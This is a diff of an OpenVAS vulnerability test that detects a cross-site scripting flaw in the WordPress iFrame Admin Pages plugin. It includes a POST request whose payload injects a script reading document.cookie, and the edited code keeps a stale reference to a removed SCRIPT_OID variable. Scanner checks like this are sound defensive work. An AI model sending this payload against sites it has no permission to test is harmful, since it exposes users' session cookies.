@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_wordpress_iframe_admin_pages_plugin_xss_vuln.nasl 3058 2016-04-14 10:45:44Z benallard $
+# $Id: gb_wordpress_iframe_admin_pages_plugin_xss_vuln.nasl 5841 2017-04-03 12:46:41Z cfi $
 #
 # WordPress iFrame Admin Pages Plugin 'url' Parameter XSS Vulnerability
 #
@@ -45,30 +45,28 @@ features, remove the product or replace the product by another one.";
 tag_summary = "This host is running WordPress with iFrame Admin Pages Plugin and
 is prone to cross site scripting vulnerability.";
 
-SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.802855";
 CPE = "cpe:/a:wordpress:wordpress";
 
 if(description)
 {
-  script_oid(SCRIPT_OID);
-  script_version("$Revision: 3058 $");
+  script_oid("1.3.6.1.4.1.25623.1.0.802855");
+  script_version("$Revision: 5841 $");
   script_bugtraq_id(53522);
   script_tag(name:"cvss_base", value:"4.3");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2016-04-14 12:45:44 +0200 (Thu, 14 Apr 2016) $");
+  script_tag(name:"last_modification", value:"$Date: 2017-04-03 14:46:41 +0200 (Mon, 03 Apr 2017) $");
   script_tag(name:"creation_date", value:"2012-05-16 15:26:57 +0530 (Wed, 16 May 2012)");
   script_name("WordPress iFrame Admin Pages Plugin 'url' Parameter XSS Vulnerability");
   script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/53522");
   script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/75626");
   script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/112701/wpiframeadminpages-xss.txt");
 
-  script_summary("Check if WordPress iFrame Admin Pages Plugin is vulnerable to XSS");
   script_category(ACT_ATTACK);
   script_tag(name:"qod_type", value:"remote_vul");
   script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
   script_family("Web application abuses");
   script_dependencies("secpod_wordpress_detect_900182.nasl");
-  script_require_keys("wordpress/installed");
+  script_mandatory_keys("wordpress/installed");
   script_require_ports("Services/www", 80);
   script_tag(name : "impact" , value : tag_impact);
   script_tag(name : "affected" , value : tag_affected);
@@ -79,12 +77,10 @@ if(description)
   exit(0);
 }
 
-
 include("http_func.inc");
 include("version_func.inc");
 include("http_keepalive.inc");
 include("host_details.inc");
-
 
 ## Variable Initialization
 dir = "";
@@ -93,22 +89,10 @@ port = 0;
 ifReq = "";
 ifRes = "";
 
-## Get HTTP Port
-if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);
-
-## Check Host Supports PHP
-if(!can_host_php(port:port)){
-  exit(0);
-}
-
-## Get WordPress Location
+if(!port = get_app_port(cpe:CPE))exit(0);
 if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);
 
-## Get Host Name or IP
-host = get_host_name();
-if(!host){
-  exit(0);
-}
+host = http_host_name(port:port);
 
 ## Path of Vulnerable Page
 url = dir + '/wp-content/plugins/iframe-admin-pages/main_page.php';
@@ -120,7 +104,7 @@ postdata = 'url="><script>alert(document.cookie)</script>&newiframe=' +
 ## Construct the POST request
 ifReq = string("POST ", url, " HTTP/1.1\r\n",
                "Host: ", host, "\r\n",
-               "User-Agent:  XSS-TEST\r\n",
+               "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
                "Content-Type: application/x-www-form-urlencoded\r\n",
                "Content-Length: ", strlen(postdata), "\r\n",
                "\r\n", postdata);
